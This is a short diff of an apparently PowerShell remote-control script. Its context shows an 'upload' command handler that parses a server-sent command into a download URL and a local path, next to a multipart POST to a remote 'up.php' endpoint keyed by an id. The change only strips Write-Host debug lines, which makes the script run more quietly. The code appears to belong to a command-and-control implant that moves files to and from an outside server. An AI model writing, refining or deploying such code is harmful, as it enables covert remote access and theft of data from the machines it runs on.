@@ -104,11 +104,9 @@ $up=(Invoke-RestMethod -Uri "$url/up.php?id=$id" -Method Post -ContentType "mult
 if ($act -eq "upload")
 {
 $urldl = ($cmd -split ':',5)[2,3]
-Write-Host "URL"
-Write-Host $urldl
+
 $urldl = ($url -join ":")
-Write-Host "URL"
-Write-Host $urldl
+
 	if ([string]::IsNullOrWhiteSpace($urldl))
     {
 	
@@ -116,8 +114,7 @@ Write-Host $urldl
     }
 
 $path = ($cmd -split ':',5)[-1]
-Write-Host "PATH"
-Write-Host $path
+
 
 $c = "Downloading "
 $d = "$($c) $($urldl) $($path)"
